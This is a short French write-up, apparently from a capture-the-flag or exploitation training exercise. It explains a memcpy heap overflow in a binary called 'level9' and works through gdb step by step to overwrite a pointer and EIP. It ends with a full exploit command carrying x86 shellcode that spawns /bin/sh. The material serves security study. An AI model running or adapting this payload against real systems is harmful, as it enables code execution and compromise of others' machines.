### Analyse

Cette fonction utilise memcpy pour écrire les octets à partir de l'emplacement mémoire pointé par "a", l'argument de la fonction, vers les emplacements mémoire commençant à "annotation".
Elle utilise également la longueur de la chaîne "a" comme nombre d'octets à écrire.
Étant donné que nous pouvons contrôler la valeur de "a", et par conséquent sa longueur, nous pouvons déborder le tampon "annotation" et provoquer des modifications dans la heap.

### Exploit

1. buffer to eax : 108
   aller dans gdb
   run $(python -c  "print  '\x90' * (109)") 

2. la Heap a ete override
    checker info proc map(dans gdb) pour connaitre l'addr du debut de la heap
    puis faite x/50wx <start_addr>
3. On constate que la heap commence a etre reecrite a partir de <start_addr + 0xc>

4. Si nous faisons la commande suivante dans gdb : 
    `run $(python -c  "print '\x90' * (108) + '\x0c\xa0\x04\x08'")`
    Nous constatons que nous avons reecrit l'EIP.

5. Nous devons ensuite faire que edx soit une addr qu'on peut call pour ensuite qu'il execute notre shellcode
    run $(python -c  "print '\x10\xa0\x04\x08' + '\x90' * (108 - 4) + '\x0c\xa0\x04\x08'")    On finis avec :
    Program received signal SIGSEGV, Segmentation fault.
    0x0806b000 in ?? ()
    En gros il a remonter tout la heap jusqu'a la fin pour voir si il y avait du code a execute mais il a rien vu.

6. Mettre le shellcode dans le code
```
 ./level9 $(python -c  "print '\x10\xa0\x04\x08' +  '\x90' * (108 - 4 - 55) + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08'")
 
```
